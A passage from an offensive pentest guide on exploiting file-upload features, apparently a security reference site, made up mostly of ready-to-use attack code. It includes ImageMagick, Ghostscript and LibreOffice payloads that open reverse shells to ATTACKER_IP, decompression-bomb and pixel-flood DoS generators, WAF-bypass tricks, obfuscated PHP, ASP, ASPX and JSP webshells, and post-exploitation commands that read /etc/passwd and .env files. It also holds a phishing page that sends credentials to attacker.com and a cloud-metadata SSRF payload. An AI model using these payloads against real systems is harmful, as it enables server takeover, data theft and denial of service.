  fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")'
  pop graphic-context
  EOF

  # Upload with image MIME type
  curl -X POST https://target.com/upload \
    -F "file=@exploit.mvg;type=image/x-mvg;filename=exploit.jpg" \
    -b "session=COOKIE"

  curl -X POST https://target.com/upload \
    -F "file=@exploit.svg;type=image/svg+xml;filename=exploit.jpg" \
    -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-image" label="Ghostscript Exploits"}
  ```bash
  # CVE-2023-36664 — Ghostscript RCE (< 10.01.2)
  # Triggered when server processes PDF/EPS/PS files

  # EPS payload
  cat > exploit.eps << 'EOF'
  %!PS-Adobe-3.0 EPSF-3.0
  %%BoundingBox: 0 0 100 100

  userdict /setpagedevice undef
  legal
  { null restore } stopped { pop } if
  { legal } stopped { pop } if
  restore
  mark /OutputFile (%pipe%id > /tmp/rce) currentdevice putdeviceprops
  EOF

  # PS payload for reverse shell
  cat > exploit.ps << 'EOF'
  %!PS
  userdict /setpagedevice undef
  save
  legal
  { null restore } stopped { pop } if
  { legal } stopped { pop } if
  restore
  mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1') currentdevice putdeviceprops
  EOF

  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@exploit.eps;type=application/postscript" \
    -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-image" label="PIL/Pillow Exploits"}
  ```bash
  # Python Pillow/PIL deserialization and RCE
  # CVE-2022-22817 — Pillow < 9.0.0 arbitrary code execution via ImageMath.eval

  # Crafted TIFF with malicious tag
  python3 << 'PILEOF'
  from PIL import Image
  import struct

  # Create image with oversized dimensions (DoS)
  # Or craft specific TIFF tags for exploitation

  # Decompression bomb (DoS)
  img = Image.new('RGB', (1, 1))
  img.save('bomb.png')

  # Actually dangerous: create a massive image reference
  # This will consume massive memory when server tries to process
  import io
  buf = io.BytesIO()
  # 100000 x 100000 pixel image header (but tiny file)
  # Server trying to decompress = DoS
  PILEOF

  # Upload crafted image
  curl -X POST https://target.com/upload \
    -F "file=@exploit.tiff;type=image/tiff" -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-image" label="LibreOffice Exploits"}
  ```bash
  # If server converts DOCX/ODT to PDF using LibreOffice
  # Macro-based RCE

  # Create ODT with embedded macro
  # Step 1: Create ODT file
  # Step 2: Add macro via Tools → Macros

  # Alternative: Python-UNO exploit
  cat > exploit_macro.py << 'EOF'
  import subprocess
  def exploit():
      subprocess.call(['/bin/bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'])
  exploit()
  EOF

  # Create malicious ODT programmatically
  python3 << 'ODTEOF'
  import zipfile
  import os

  # Create minimal ODT
  with zipfile.ZipFile('exploit.odt', 'w') as z:
      z.writestr('mimetype', 'application/vnd.oasis.opendocument.text')
      z.writestr('META-INF/manifest.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
    <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>
    <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
    <manifest:file-entry manifest:full-path="Basic/Standard/exploit.xml" manifest:media-type="text/xml"/>
    <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
  </manifest:manifest>''')
      z.writestr('content.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
   xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
    <office:body><office:text><text:p>test</text:p></office:text></office:body>
  </office:document-content>''')
      z.writestr('Basic/Standard/exploit.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <script:module xmlns:script="http://openoffice.org/2000/script"
   script:name="exploit" script:language="StarBasic">
  Sub Main
    Shell("bash -c 'id > /tmp/rce'")
  End Sub
  </script:module>''')
      z.writestr('Basic/script-lc.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <library:libraries xmlns:library="http://openoffice.org/2000/library">
    <library:library library:name="Standard" library:link="false"/>
  </library:libraries>''')

  print("Created exploit.odt")
  ODTEOF

  curl -X POST https://target.com/upload \
    -F "file=@exploit.odt" -b "session=COOKIE"
  ```
  :::
::

---

## Denial of Service via Upload

::card-group
  :::card
  ---
  icon: i-lucide-bomb
  title: Decompression Bomb
  ---
  Upload a tiny compressed file that expands to enormous size when the server decompresses/processes it.
  :::

  :::card
  ---
  icon: i-lucide-maximize
  title: Pixel Flood
  ---
  Upload an image with huge dimensions but small file size. Server runs out of memory trying to process.
  :::

  :::card
  ---
  icon: i-lucide-infinity
  title: Endless Processing
  ---
  Upload specially crafted files that cause infinite loops in server-side parsers.
  :::

  :::card
  ---
  icon: i-lucide-hard-drive
  title: Disk Exhaustion
  ---
  Upload many large files to fill the server's disk space.
  :::
::

::code-collapse
```bash [DoS Payload Generation]
# === Decompression Bomb (Zip Bomb) ===
# Create a 42.zip style bomb
dd if=/dev/zero bs=1M count=1000 | gzip > bomb.gz
# 1GB of zeros compresses to ~1MB

# Nested zip bomb
dd if=/dev/zero bs=1M count=100 of=zeros.bin
zip bomb1.zip zeros.bin
# Repeat nesting
for i in $(seq 1 5); do
  cp bomb1.zip file_$i.zip
done
zip bomb2.zip file_*.zip
rm file_*.zip
for i in $(seq 1 5); do
  cp bomb2.zip file_$i.zip
done
zip bomb3.zip file_*.zip

# Python zip bomb generator
python3 << 'BOMBEOF'
import zipfile
import io

# Create 10GB zip bomb from 10MB file
data = b'\x00' * (10 * 1024 * 1024)  # 10MB of zeros

with zipfile.ZipFile('bomb.zip', 'w', zipfile.ZIP_DEFLATED) as z:
    for i in range(100):  # 100 x 10MB = 1GB uncompressed
        z.writestr(f'file_{i}.bin', data)

print(f"Created bomb.zip")
import os
print(f"File size: {os.path.getsize('bomb.zip')} bytes")
BOMBEOF

# === Pixel Flood Attack ===
# Create image with huge dimensions
python3 << 'PIXEOF'
# This creates a valid PNG header claiming 100000x100000 pixels
# But actual file is tiny. Server tries to allocate memory for full image.
import struct
import zlib

def create_chunk(chunk_type, data):
    chunk = chunk_type + data
    return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)

png = b'\x89PNG\r\n\x1a\n'

# IHDR: 100000 x 100000 pixels, 8-bit RGBA
width = 100000
height = 100000
ihdr = struct.pack('>IIBBBBB', width, height, 8, 6, 0, 0, 0)
png += create_chunk(b'IHDR', ihdr)

# Minimal IDAT
raw = zlib.compress(b'\x00' + b'\x00\x00\x00\xff' * 1)
png += create_chunk(b'IDAT', raw)
png += create_chunk(b'IEND', b'')

with open('pixel_flood.png', 'wb') as f:
    f.write(png)
print(f"Created pixel_flood.png ({len(png)} bytes)")
print(f"Claims to be {width}x{height} = {width*height*4/1024/1024/1024:.1f} GB uncompressed")
PIXEOF

# === Upload many large files (Disk Exhaustion) ===
# Generate large file
dd if=/dev/urandom bs=1M count=100 of=large_file.bin

# Upload in loop
for i in $(seq 1 1000); do
  curl -s -X POST https://target.com/upload \
    -F "file=@large_file.bin;filename=file_$i.bin" \
    -b "session=COOKIE" &
done

# === Billion Laughs (XML Bomb) via Upload ===
cat > xmlbomb.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
EOF
# Expands to ~3GB of "lol" strings
```
::

---

## Automated Scanning Tools

### Nuclei Templates

::code-group
```bash [Nuclei Scan]
# Scan for file upload vulnerabilities
nuclei -u https://target.com -tags upload,file-upload -v
nuclei -u https://target.com -tags file-inclusion -v

# Scan with all relevant templates
nuclei -u https://target.com -t http/vulnerabilities/ -tags upload
nuclei -u https://target.com -t http/cves/ | grep -i upload

# Custom nuclei template for file upload testing
nuclei -u https://target.com -t custom-upload-test.yaml -v

# Scan multiple targets
cat targets.txt | nuclei -tags upload,file-upload -v -o upload_results.txt
```

```yaml [Custom Nuclei Template]
id: file-upload-test
info:
  name: Unrestricted File Upload Test
  severity: critical
  author: hunter
  tags: upload

http:
  - raw:
      - |
        POST /upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----FormBoundary

        ------FormBoundary
        Content-Disposition: form-data; name="file"; filename="test.php"
        Content-Type: image/jpeg

        <?php echo "UPLOAD_SUCCESS_MARKER"; ?>
        ------FormBoundary--
    matchers:
      - type: word
        words:
          - "UPLOAD_SUCCESS_MARKER"
        condition: or
      - type: status
        status:
          - 200
```

```bash [Bulk Extension Test]
# Nuclei with multiple extension payloads
cat > upload-ext-fuzz.yaml << 'YAMLEOF'
id: upload-extension-fuzz
info:
  name: Upload Extension Bypass Fuzz
  severity: high
  author: hunter
  tags: upload

http:
  - raw:
      - |
        POST /upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----Boundary

        ------Boundary
        Content-Disposition: form-data; name="file"; filename="test.{{ext}}"
        Content-Type: image/jpeg

        <?php echo md5("upload_test"); ?>
        ------Boundary--
    payloads:
      ext:
        - php
        - php3
        - php5
        - phtml
        - phar
        - phps
        - pht
        - Php
        - PHP
        - php.jpg
        - php%00.jpg
    matchers:
      - type: status
        status:
          - 200
YAMLEOF

nuclei -u https://target.com -t upload-ext-fuzz.yaml -v
```
::

### Dedicated Upload Testing Tools

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Fuxploider"}
  ```bash
  # Fuxploider — Automated file upload vulnerability scanner
  git clone https://github.com/almandin/fuxploider.git
  cd fuxploider
  pip3 install -r requirements.txt

  # Basic scan
  python3 fuxploider.py --url https://target.com/upload --not-regex "error|invalid"

  # With authentication
  python3 fuxploider.py \
    --url https://target.com/upload \
    --cookies "session=COOKIE_VALUE" \
    --not-regex "error|failed"

  # Specify form field name
  python3 fuxploider.py \
    --url https://target.com/upload \
    --cookies "session=COOKIE" \
    --input-name "file" \
    --not-regex "error"

  # With proxy for Burp interception
  python3 fuxploider.py \
    --url https://target.com/upload \
    --cookies "session=COOKIE" \
    --proxy http://127.0.0.1:8080
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Upload Scanner (Burp Extension)"}
  ```
  # Burp Suite Upload Scanner Extension
  # Install from BApp Store: "Upload Scanner"

  # Features:
  # - Automatic extension fuzzing
  # - MIME type bypass testing
  # - Magic byte injection
  # - Polyglot file generation
  # - .htaccess upload testing
  # - Path traversal via filename
  # - Content-Type manipulation
  # - ImageTragick payload testing
  # - SVG XSS/XXE testing

  # Usage:
  # 1. Capture upload request in Proxy
  # 2. Right-click → Extensions → Upload Scanner
  # 3. Configure scan settings
  # 4. Review results in Scanner tab

  # Alternative: ActiveScan++ (Burp Extension)
  # Adds file upload checks to active scanner
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Custom Python Scanner"}
  ```python
  #!/usr/bin/env python3
  """
  Custom File Upload Vulnerability Scanner
  Usage: python3 upload_scanner.py -u https://target.com/upload -c "session=COOKIE"
  """
  import requests
  import argparse
  import io
  import sys

  class UploadScanner:
      def __init__(self, url, cookies, field="file", proxy=None):
          self.url = url
          self.session = requests.Session()
          self.session.cookies.update(dict(c.split("=",1) for c in cookies.split(";")))
          self.field = field
          if proxy:
              self.session.proxies = {"http": proxy, "https": proxy}
              self.session.verify = False
          self.results = []

      def test_upload(self, filename, content, content_type, desc):
          try:
              files = {self.field: (filename, io.BytesIO(content), content_type)}
              r = self.session.post(self.url, files=files, timeout=10)
              status = "UPLOADED" if r.status_code == 200 and "error" not in r.text.lower() else "BLOCKED"
              result = f"[{status}] {desc}: {filename} (MIME: {content_type}) -> HTTP {r.status_code}"
              print(result)
              self.results.append(result)
              return status == "UPLOADED"
          except Exception as e:
              print(f"[ERROR] {desc}: {e}")
              return False

      def run_all_tests(self):
          shell = b'<?php echo md5("upload_scanner_test"); ?>'
          gif_shell = b'GIF89a' + shell
          jpg_shell = b'\xff\xd8\xff\xe0' + shell
          png_shell = b'\x89PNG\r\n\x1a\n' + shell

          print("\n=== EXTENSION BYPASS TESTS ===")
          exts = ['php','php3','php4','php5','php7','pht','phtml','phar',
                  'Php','PHP','pHp','PhP','php.jpg','php.png','php%00.jpg',
                  'php.','php..','php ','php%20']
          for ext in exts:
              self.test_upload(f"test.{ext}", shell, "image/jpeg",
                            f"Extension: .{ext}")

          print("\n=== MIME TYPE BYPASS TESTS ===")
          mimes = ['image/jpeg','image/png','image/gif','text/plain',
                   'application/octet-stream','application/x-httpd-php']
          for mime in mimes:
              self.test_upload("test.php", shell, mime,
                            f"MIME spoof: {mime}")

          print("\n=== MAGIC BYTES BYPASS TESTS ===")
          self.test_upload("test.php", gif_shell, "image/gif", "GIF89a + PHP")
          self.test_upload("test.php", jpg_shell, "image/jpeg", "JPEG header + PHP")
          self.test_upload("test.php", png_shell, "image/png", "PNG header + PHP")

          print("\n=== CONFIG FILE UPLOAD TESTS ===")
          self.test_upload(".htaccess",
              b'AddType application/x-httpd-php .jpg', "text/plain", ".htaccess upload")
          self.test_upload(".user.ini",
              b'auto_prepend_file=shell.jpg', "text/plain", ".user.ini upload")
          self.test_upload("web.config",
              b'<?xml version="1.0"?><configuration></configuration>',
              "text/xml", "web.config upload")

          print("\n=== XSS VIA UPLOAD TESTS ===")
          svg_xss = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'
          self.test_upload("test.svg", svg_xss, "image/svg+xml", "SVG XSS")
          self.test_upload("test.html",
              b'<html><body><script>alert(1)</script></body></html>',
              "text/html", "HTML XSS")

          print("\n=== XXE VIA UPLOAD TESTS ===")
          xxe_svg = b'''<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
          <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'''
          self.test_upload("test.svg", xxe_svg, "image/svg+xml", "SVG XXE")

          print("\n=== PATH TRAVERSAL TESTS ===")
          traversals = ["../test.php", "../../test.php",
                       "..\\test.php", "..%2ftest.php"]
          for t in traversals:
              self.test_upload(t, shell, "image/jpeg", f"Traversal: {t}")

          print(f"\n=== SCAN COMPLETE: {len(self.results)} tests ===")

  if __name__ == "__main__":
      parser = argparse.ArgumentParser()
      parser.add_argument("-u", "--url", required=True)
      parser.add_argument("-c", "--cookies", required=True)
      parser.add_argument("-f", "--field", default="file")
      parser.add_argument("-p", "--proxy", default=None)
      args = parser.parse_args()
      
      scanner = UploadScanner(args.url, args.cookies, args.field, args.proxy)
      scanner.run_all_tests()
  ```
  :::
::

---

## WAF Bypass Techniques

::caution
Web Application Firewalls add an additional layer of defense. These techniques help identify weaknesses in WAF file upload rules.
::

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Content-Type Manipulation"}
  ```bash
  # Capitalize Content-Type
  Content-Type: IMAGE/JPEG
  Content-Type: Image/Jpeg
  CONTENT-TYPE: image/jpeg

  # Add charset
  Content-Type: image/jpeg; charset=utf-8

  # Extra whitespace
  Content-Type:  image/jpeg
  Content-Type: image/jpeg  
  Content-Type:image/jpeg

  # Double Content-Type (some WAFs check first, app checks last)
  Content-Type: image/jpeg
  Content-Type: application/x-php

  # Invalid but accepted Content-Type
  Content-Type: image/jpeg;boundary=something
  Content-Type: image/jpeg\r\n

  # Chunked transfer encoding (WAF may not reassemble)
  Transfer-Encoding: chunked
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Multipart Tricks"}
  ```bash
  # Extra form field before file (WAF may stop scanning after first field)
  ------boundary
  Content-Disposition: form-data; name="dummy"

  safe content here
  ------boundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg

  <?php system($_GET['cmd']); ?>
  ------boundary--

  # Very long boundary
  Content-Type: multipart/form-data; boundary=AAAA....(2000 A's)....AAAA

  # Boundary with special characters
  Content-Type: multipart/form-data; boundary="boundary with spaces"
  Content-Type: multipart/form-data; boundary=--=_NextPart_SMP

  # Missing Content-Disposition quotes
  Content-Disposition: form-data; name=file; filename=shell.php

  # Extra parameters in Content-Disposition
  Content-Disposition: form-data; name="file"; filename="shell.php"; dummy="value"

  # Line folding (deprecated but some parsers support)
  Content-Disposition: form-data;
   name="file";
   filename="shell.php"

  # CR without LF (or LF without CR)
  # Use hex editor to modify request

  # Double filename parameter
  Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Encoding & Obfuscation"}
  ```bash
  # PHP short tags (may bypass content scanning)
  <?=system($_GET['cmd'])?>
  <%system($_GET['cmd']);%>
  <script language="php">system($_GET['cmd']);</script>

  # PHP with HTML comment obfuscation
  <!--?php system($_GET['cmd']); ?-->

  # Unicode BOM + PHP
  printf '\xef\xbb\xbf<?php system($_GET["cmd"]); ?>' > bom_shell.php

  # PHP with excessive whitespace
  <?php     system   (   $_GET  [  'cmd'  ]  )  ;     ?>

  # PHP with comments
  <?php /*comment*/ system/*comment*/($_GET/*comment*/['cmd']/*comment*/); ?>

  # PHP with string concatenation to avoid signature
  <?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>

  # PHP with variable function name
  <?php $_GET['f']($_GET['c']); ?>
  # Usage: ?f=system&c=id

  # Hex-encoded PHP
  <?php $x="\x73\x79\x73\x74\x65\x6d";$x($_GET['c']); ?>

  # Base64 payload in image
  python3 -c "
  import base64
  shell = '<?php system(\$_GET[\"cmd\"]); ?>'
  encoded = base64.b64encode(shell.encode()).decode()
  print(f'GIF89a<?php eval(base64_decode(\"{encoded}\")); ?>')
  " > waf_bypass.gif.php
  ```
  :::
::

---

## Post-Upload Exploitation

### Finding Uploaded Files

::code-group
```bash [Path Discovery]
# Check response for upload path
curl -X POST https://target.com/upload \
  -F "file=@test.jpg" -b "session=COOKIE" -v 2>&1 | grep -iE "path|url|location|file"

# Common upload directories
/uploads/
/upload/
/files/
/media/
/images/
/attachments/
/static/uploads/
/content/uploads/
/wp-content/uploads/
/assets/uploads/
/public/uploads/
/storage/uploads/
/data/uploads/
/tmp/uploads/
/user_uploads/
/documents/

# Brute force upload directory
ffuf -u https://target.com/FUZZ/test.php -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | grep -i upload

# Check if filename is predictable or randomized
# Upload multiple files and compare returned URLs
for i in $(seq 1 5); do
  curl -s -X POST https://target.com/upload \
    -F "file=@test.jpg;filename=test_$i.jpg" -b "session=COOKIE"
done

# If filename is hashed/randomized, check for:
# - Timestamp-based names
# - Sequential IDs
# - MD5 of original filename
# - UUID format
```

```bash [Trigger Execution]
# Access uploaded webshell
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=whoami"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# If extension was changed, try direct include
curl "https://target.com/uploads/shell.jpg"
# May execute as PHP if .htaccess was uploaded

# Check if file is served through a handler
curl -sI "https://target.com/uploads/shell.php" | grep -i content-type
# If Content-Type: text/html or application/x-httpd-php → executing
# If Content-Type: application/octet-stream → not executing

# Local File Inclusion to trigger uploaded file
curl "https://target.com/index.php?page=../uploads/shell.jpg"
curl "https://target.com/index.php?file=../uploads/shell"
curl "https://target.com/index.php?template=../uploads/shell.jpg"

# PHP wrappers to include uploaded file
curl "https://target.com/index.php?page=php://filter/convert.base64-decode/resource=../uploads/shell.b64"
```

```bash [Post-Exploitation Commands]
# System enumeration
curl "https://target.com/uploads/shell.php?cmd=uname+-a"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/os-release"
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=pwd"
curl "https://target.com/uploads/shell.php?cmd=ls+-la"
curl "https://target.com/uploads/shell.php?cmd=env"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
curl "https://target.com/uploads/shell.php?cmd=netstat+-tlnp"
curl "https://target.com/uploads/shell.php?cmd=ps+aux"

# Reverse shell from webshell
curl "https://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

# Download sensitive files
curl "https://target.com/uploads/shell.php?cmd=cat+/var/www/html/config.php"
curl "https://target.com/uploads/shell.php?cmd=cat+/var/www/html/.env"
curl "https://target.com/uploads/shell.php?cmd=find+/+-name+'*.conf'+-type+f+2>/dev/null"
```
::

---

## Chaining File Upload with Other Vulnerabilities

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: Upload + LFI = RCE
  ---
  Upload a file with PHP code (any extension), then use Local File Inclusion to include and execute it.
  
  `?page=../../uploads/avatar.jpg`
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Upload + SSRF = Internal Access
  ---
  Upload SVG/PDF with SSRF payloads targeting internal services, cloud metadata, or admin panels.
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Upload + XXE = Data Exfil
  ---
  Upload DOCX/SVG/XML with XXE payloads to read internal files or perform SSRF.
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Upload + Path Traversal = Config Overwrite
  ---
  Upload .htaccess, web.config, or cron jobs to arbitrary paths for persistent access.
  :::
::

::code-collapse
```bash [Chaining Examples]
# === Chain 1: Upload + LFI = RCE ===
# Step 1: Upload PHP in image
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
curl -X POST https://target.com/upload -F "file=@shell.gif" -b "session=COOKIE"
# Response: File uploaded to /uploads/shell.gif

# Step 2: Include via LFI
curl "https://target.com/index.php?page=../uploads/shell.gif&cmd=id"
curl "https://target.com/index.php?page=....//....//uploads/shell.gif&cmd=id"
curl "https://target.com/index.php?page=php://filter/resource=../uploads/shell.gif&cmd=id"


# === Chain 2: Upload + IDOR = Account Takeover ===
# Step 1: Upload avatar for your account
curl -X POST https://target.com/api/avatar \
  -F "file=@malicious.svg" -F "user_id=1337" -b "session=COOKIE"
# Step 2: Change user_id to victim's ID
curl -X POST https://target.com/api/avatar \
  -F "file=@xss.svg" -F "user_id=1" -b "session=COOKIE"
# Victim's avatar now contains XSS


# === Chain 3: Upload .htaccess + Shell Image ===
# Step 1: Upload .htaccess to make .jpg executable
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -X POST https://target.com/upload -F "file=@.htaccess" -b "session=COOKIE"
# Step 2: Upload shell as .jpg
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -X POST https://target.com/upload -F "file=@shell.jpg" -b "session=COOKIE"
# Step 3: Execute
curl "https://target.com/uploads/shell.jpg?cmd=id"


# === Chain 4: Upload + Open Redirect = Phishing ===
# Upload HTML phishing page
cat > phish.html << 'EOF'
<html><body>
<h1>Session Expired - Please Login</h1>
<form action="https://attacker.com/creds" method="POST">
  <input name="username" placeholder="Username"><br>
  <input name="password" type="password" placeholder="Password"><br>
  <button>Login</button>
</form>
</body></html>
EOF
curl -X POST https://target.com/upload -F "file=@phish.html" -b "session=COOKIE"
# Share: https://target.com/uploads/phish.html


# === Chain 5: Upload + Deserialization ===
# Upload serialized PHP object
python3 -c "
# PHP serialized payload (example for vulnerable unserialize)
payload = 'O:8:\"Backdoor\":1:{s:3:\"cmd\";s:2:\"id\";}'
with open('serial.txt', 'w') as f:
    f.write(payload)
"
curl -X POST https://target.com/upload -F "file=@serial.txt" -b "session=COOKIE"


# === Chain 6: Upload + SSTI ===
# If uploaded filename or content is rendered in template
# Upload file with SSTI payload in filename
curl -X POST https://target.com/upload \
  -F 'file=@test.jpg;filename={{7*7}}.jpg' -b "session=COOKIE"
# Check if response shows 49 instead of {{7*7}}
# If yes, escalate:
curl -X POST https://target.com/upload \
  -F 'file=@test.jpg;filename={{config.__class__.__init__.__globals__["os"].popen("id").read()}}.jpg' \
  -b "session=COOKIE"
```
::

---

## File Upload Checklist

::steps{level="4"}

#### Discover Upload Functionality

```bash
# Crawl and enumerate
katana -u https://target.com -d 5 -jc | grep -i upload
waybackurls target.com | grep -i upload
ffuf -u https://target.com/FUZZ -w upload-wordlist.txt
```

#### Fingerprint Backend Technology

```bash
whatweb https://target.com
curl -sI https://target.com | grep -i server
nuclei -u https://target.com -tags tech
```

#### Identify Validation Type

```bash
# Upload legitimate file (baseline)
# Upload wrong extension + correct MIME
# Upload correct extension + wrong MIME
# Upload double extension
# Compare all responses
```

#### Test Extension Bypasses

```bash
# Alternative extensions (.phtml, .php5, .phar)
# Double extensions (.php.jpg)
# Case variations (.PHP, .Php)
# Null byte (.php%00.jpg)
# Special characters (.php;.jpg, .php::$DATA)
# Trailing dots/spaces (.php., .php%20)
```

#### Test MIME & Content Bypasses

```bash
# Spoof Content-Type header
# Prepend magic bytes (GIF89a, \xff\xd8\xff\xe0)
# Create polyglot files
# Inject code into EXIF metadata
```

#### Test Configuration File Upload

```bash
# Upload .htaccess (Apache)
# Upload web.config (IIS)
# Upload .user.ini (PHP-FPM)
```

#### Test XSS/XXE/SSRF via Upload

```bash
# SVG with XSS payload
# SVG/DOCX with XXE payload
# SVG/PDF with SSRF payload
# HTML file with JavaScript
```

#### Test Path Traversal

```bash
# ../../../shell.php in filename
# URL-encoded traversal
# Overwrite server config files
```

#### Test Race Conditions

```bash
# Upload + access simultaneously
# Use threading/Turbo Intruder
```

#### Verify Execution & Document

```bash
# Access uploaded file
# Confirm code execution
# Document full reproduction steps
# Calculate CVSS score
# Write report
```

::

---

## Severity Classification

::collapsible
**CVSS Scoring Guide for File Upload Vulnerabilities**

| Scenario | Severity | CVSS Range |
| --- | --- | --- |
| RCE via webshell upload | **Critical** | 9.0 - 10.0 |
| RCE via ImageMagick/Ghostscript | **Critical** | 9.0 - 10.0 |
| File overwrite (config/crontab) | **Critical** | 8.5 - 9.5 |
| XXE with file read via upload | **High** | 7.0 - 8.5 |
| SSRF via SVG/PDF upload | **High** | 6.5 - 8.0 |
| Stored XSS via SVG/HTML upload | **Medium-High** | 5.5 - 7.5 |
| Path traversal write (non-exec) | **Medium-High** | 5.0 - 7.0 |
| Arbitrary file upload (no execution) | **Medium** | 4.0 - 6.0 |
| DoS via decompression bomb | **Medium** | 4.0 - 5.5 |
| Client-side only bypass | **Informational** | 0.0 - 2.0 |
::

---

## Quick Reference Payloads

::code-tree{default-value="shells/php_basic.php"}
```php [shells/php_basic.php]
<?php system($_GET['cmd']); ?>
```

```php [shells/php_obfuscated.php]
<?php $x=base64_decode('c3lzdGVt');$x($_GET['c']); ?>
```

```asp [shells/asp_basic.asp]
<% eval request("cmd") %>
```

```aspx [shells/aspx_basic.aspx]
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%string c=Request["cmd"];Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
```

```jsp [shells/jsp_basic.jsp]
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

```xml [payloads/svg_xss.svg]
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
```

```xml [payloads/svg_xxe.svg]
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

```xml [payloads/svg_ssrf.svg]
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/></svg>
```

```text [config/.htaccess]
AddType application/x-httpd-php .jpg .png .gif
```

```text [config/.user.ini]
auto_prepend_file=shell.jpg
```

```xml [config/web.config]
<?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers><add name="aspjpg" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/></handlers></system.webServer></configuration>
```
::